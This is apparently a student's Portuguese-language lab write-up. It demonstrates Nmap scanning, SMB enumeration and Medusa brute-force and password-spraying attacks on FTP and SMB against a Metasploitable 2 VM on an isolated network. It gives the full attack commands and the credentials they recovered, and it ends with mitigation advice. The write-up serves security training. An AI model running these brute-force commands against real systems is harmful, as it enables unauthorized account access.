# 🔐 Desafio de Projeto – Medusa no Kali Linux

Este projeto demonstra o uso da ferramenta **Medusa** em conjunto com o **Kali Linux** para realizar testes de força bruta e enumeração em ambientes controlados, utilizando a máquina vulnerável **Metasploitable 2**.

O objetivo é compreender as etapas de **pentest ofensivo**, desde a configuração do ambiente até a identificação de credenciais e mitigação de vulnerabilidades.

---

## 🧩 Estrutura do Ambiente

O ambiente foi configurado em duas máquinas virtuais no **VMware**, com **rede interna (Host-Only)** para isolar o teste:

| Função | Sistema | IP | Descrição |
|--------|----------|----|-----------|
| Atacante | Kali Linux | 192.168.126.129 | Máquina utilizada para realizar os testes |
| Alvo | Metasploitable 2 | 192.168.126.128 | Máquina vulnerável para exploração |

A comunicação entre as máquinas foi validada via **ICMP (ping)**, confirmando conectividade com sucesso.

---

## ⚙️ Ferramentas Utilizadas

- **Kali Linux**
- **Metasploitable 2**
- **Nmap**
- **Medusa**
- **Enum4Linux**
- **SMBClient**

---

## 🧠 Etapas do Projeto

### 1. Enumeração de Serviços com Nmap
Comando executado:
```bash
nmap -sV -p 21,22,80,443,445,139 192.168.126.128
```
> Resultado: Identificação dos serviços abertos na máquina alvo.

---

### 2. Ataque de Força Bruta em FTP com Medusa
Comando:
```bash
medusa -h 192.168.126.128 -U '/home/kali/users' -P '/home/kali/pass' -M ftp -t 6
```
> ✅ Ataque bem-sucedido.  
> **Usuário:** msfadmin  
> **Senha:** msfadmin  

Login confirmado no serviço **FTP** com sucesso.

---

### 3. Captura de Credenciais via Código Fonte (POST)
Durante a inspeção de uma página web vulnerável, foram encontradas credenciais expostas:

```
Usuário: admin
Senha: 1234
```

---

### 4. Enumeração com Enum4Linux
Comando:
```bash
enum4linux -a 192.168.126.128 | tee Enum_saida.txt
```
> Resultado: enumeração de usuários e compartilhamentos SMB.

---

### 5. Ataque Password Spraying em SMB
Comando:
```bash
medusa -h 192.168.126.128 -U smb_users.txt -P smb_senhas.txt -M smbnt -t 2 -T 50
```
> ✅ Ataque bem-sucedido.  
> **Usuário:** msfadmin  
> **Senha:** msfadmin  

Verificação do acesso:
```bash
smbclient -L //192.168.126.128 -U msfadmin
```

---

## 🛡️ Medidas de Mitigação

- Bloqueio de conta ou atraso progressivo após tentativas fracassadas.  
- Forçar uso de **senhas fortes** e políticas de expiração.  
- **Habilitar MFA** (autenticação multifator) sempre que possível.  
- Substituir **FTP por SFTP/FTPS** para uso de criptografia.  
- Desabilitar **SMBv1**, aplicar **patches de segurança** e hardening.  
- Implementar **rate-limiting**, **WAF** e proteções de formulários web.  
- Monitorar logs e alertas de tentativas suspeitas.  
- Educar usuários para criação de **senhas seguras**.

---

## 📚 Conclusão

O experimento demonstra como ferramentas como o **Medusa** podem ser utilizadas para testar a robustez de serviços vulneráveis em um ambiente controlado, destacando a importância da segurança defensiva, políticas de senha e boas práticas de mitigação.

---

## 🧾 Autor

**Carlos Henrique**  
Projeto desenvolvido como parte do desafio prático sobre **segurança ofensiva com Medusa e Kali Linux**.
